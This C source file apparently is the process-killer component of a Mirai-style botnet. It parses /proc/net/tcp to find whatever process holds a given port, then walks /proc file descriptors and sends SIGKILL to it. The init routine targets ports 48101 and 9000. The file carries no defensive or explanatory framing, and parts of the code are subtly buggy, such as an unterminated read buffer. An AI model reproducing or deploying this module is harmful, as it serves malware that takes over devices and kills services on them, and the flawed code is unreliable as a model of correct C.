#define _GNU_SOURCE

#include <stdint.h>
#include <fcntl.h>
#include <stdlib.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>

#include "main.h"
#include "entry.h"

static char *read_line(int fd, char *buffer, int buffer_size)
{
    int p = 0;
    int x = 0;

    while(TRUE)
    {
        x = read(fd, buffer + p, 1);

		if(x == 0)
		{
			break;
		}

        if(buffer[p] == '\r' || buffer[p] == '\n')
        {
            break;
        }

        p++;
    }

    if(!x)
    {
        return NULL;
    }

    return buffer;
}

static void d(int val, char *buf, int len, int base)
{
    int s = val;
    int i = 0;
    int x = 0;

    while(TRUE)
    {
        if(!s && i == len)
        {
            break;
        }

        x = s % base;

        s /= base;

        if(x < 10)
        {
            buf[i++] = 48 + x;
            continue;
        }

        buf[i++] = 65 + x - 10;
    }

    buf[i] = 0;

    return;
}

void terminate_process_via_port(uint16_t in)
{
	int fd = -1;
    char buf[256];
    char u[5];
    uint8_t b1, b2, b3, b4;

    fd = open("/proc/net/tcp", O_RDONLY);
    if(fd == -1)
    {
        return;
    }

    d(in, u, 4, 16);

    b1 = u[0];
    b2 = u[1];
    b3 = u[2];
    b4 = u[3];

    u[0] = b4;
    u[1] = b3;
    u[2] = b2;
    u[3] = b1;

    while(read_line(fd, buf, sizeof(buf)) != NULL)
    {
        int i = 0;
        char tmp[512];
        int s = 0;
        int v = 0;
		char *b;
        char port[512];
        char *c;
        int m = 0;
        int spaces = 0;
        char inode[512];
        int inode_len = 0;
        DIR *proc;
        struct dirent *pid;
		int len = 0;

        while(buf[i] != 0 && buf[i] != ':')
            i++;

        if(!buf[i])
            continue;

        i = i + 2;

        b = buf;

        s = i;

        b = buf + s;
        c = b;

        while(buf[s] != 0 && buf[s] != ' ')
            s++;

		len = s - i;

        memcpy(tmp, b, len);
		tmp[len] = 0;

        while(tmp[v] != 0 && tmp[v] != ':')
            v++;

        b = tmp;

		len = s - i - v - 1;

        memcpy(port, b + v + 1, len);
		port[len] = 0;

        if(strcasestr(port, u))
        {
            DEBUG_PRINT("Found process binded to port %d!\n", in);

            while(TRUE)
            {
                if(!*c)
                {
                    break;
                }

                if(*c != ' ')
                {
                    c++;
                    spaces = 0;
                    continue;
                }

                spaces++;

                if(spaces == TAB)
                {
                    char *kk;

                    kk = c + 3;

                    while(*kk != 0 && *kk != ' ')
                    {
                        kk++;
                        inode_len++;
                    }

                    if(!inode_len)
                    {
                        break;
                    }

                    memcpy(inode, c + 3, inode_len);
					inode[inode_len] = 0;

                    break;
                }

                m++;
                c++;
            }

            if(inode_len == 0)
            {
                DEBUG_PRINT("Failed to find inode for port %d!\n", in);
                break;
            }

            DEBUG_PRINT("Found inode: %s\n", inode);

            proc = opendir("/proc/");
            if(!proc)
            {
                break;
            }

            while((pid = readdir(proc)) != NULL)
            {
                char fd_buf[4096];
                struct dirent *fd;
                DIR *fd_path;

                if(*(pid->d_name) < '0' || *(pid->d_name) > '9')
                    continue;
                
                memset(fd_buf, 0, sizeof(fd_buf));

                strcpy(fd_buf, "/proc/");
                strcat(fd_buf, pid->d_name);
                strcat(fd_buf, "/fd");
                fd_path = opendir(fd_buf);
                if(!fd_path)
                {
                    continue;
                }

                while((fd = readdir(fd_path)) != NULL)
                {
                    char link[4096];
                    char ym[4096];
                    int e = 0;

                    if(*(fd->d_name) < '0' || *(fd->d_name) > '9')
                        continue;

                    strcpy(link, "/proc/");
                    strcat(link, pid->d_name);
                    strcat(link, "/fd");
                    strcat(link, "/");
                    strcat(link, fd->d_name);
                    e = readlink(link, ym, sizeof(ym) - 1);
                    if(e == -1)
                    {
                        break;
                    }
                    ym[e] = 0;

                    if(strcasestr(ym, inode))
                    {
                        DEBUG_PRINT("Found process PID: %s\n", pid->d_name);
                        kill(atoi(pid->d_name), SIGKILL);
                        DEBUG_PRINT("Sent SIGKILL to PID: %s\n", pid->d_name);
                    }
                }

                closedir(fd_path);
            }

            closedir(proc);
            break;
        }
    }

	close(fd);
    return;
}

void init_kill(void)
{
    // Terminate some processes holding ports
 
    //terminate_process_via_port(9000);
    terminate_process_via_port(48101);
    terminate_process_via_port(9000);
    //terminate_process_via_port(5555);
 
    return;
}
